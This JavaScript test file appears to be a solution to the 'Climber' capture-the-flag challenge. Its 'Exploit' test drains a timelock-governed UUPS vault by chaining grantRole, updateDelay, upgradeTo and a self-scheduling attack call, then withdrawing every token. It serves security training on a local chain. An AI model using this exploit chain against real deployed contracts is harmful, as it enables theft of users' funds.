const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
       
        // Connect to existing contracts as attacker
        const attackVault = this.vault.connect(attacker);
        const attackTimeLock = this.timelock.connect(attacker);
        const attackToken = this.token.connect(attacker);

        // Deploy the attacking contract
        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", attacker);
        const attackContract = await AttackContractFactory.deploy(
            attackVault.address,
            attackTimeLock.address,
            attackToken.address,
            attacker.address);

        // Deploy upgradable contract that will act as new logic contract instead of ClimberVault.sol
        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", attacker);
        const maliciousVaultContract = await MalciousVaultFactory.deploy();

        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));

        // Helper function to create ABIs
        const createInterface = (signature, methodName, arguments) => {
            const ABI = signature;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName, arguments);
            return ABIData;
        }

        // Set attacker contract as "proposer" for timelock
        const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
        const grantRoleData = createInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address]);

        // Update delay to 0
        const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
        const updateDelayData = createInterface(updateDelayABI, "updateDelay", [0]);

        // Call to the vault to upgrade to attacker controlled contract logic
        const upgradeABI = ["function upgradeTo(address newImplementation)"];
        const upgradeData = createInterface(upgradeABI, "upgradeTo", [maliciousVaultContract.address]);

        // Call Attacking Contract to schedule these actions and sweep funds
        const exploitABI = ["function exploit()"];
        const exploitData = createInterface(exploitABI, "exploit", undefined);

        const toAddress = [attackTimeLock.address, attackTimeLock.address, attackVault.address, attackContract.address];
        const data = [grantRoleData, updateDelayData, upgradeData, exploitData]

        // Set our 4 calls to attacking contract
        await attackContract.setScheduleData(
            toAddress,
            data
        );

        // execute the 4 scheduled calls
        await attackTimeLock.execute(
            toAddress,
            Array(data.length).fill(0),
            data,
            ethers.utils.hexZeroPad("0x00", 32)
        );

        // Withdraw our funds from attacking contract
        await attackContract.withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
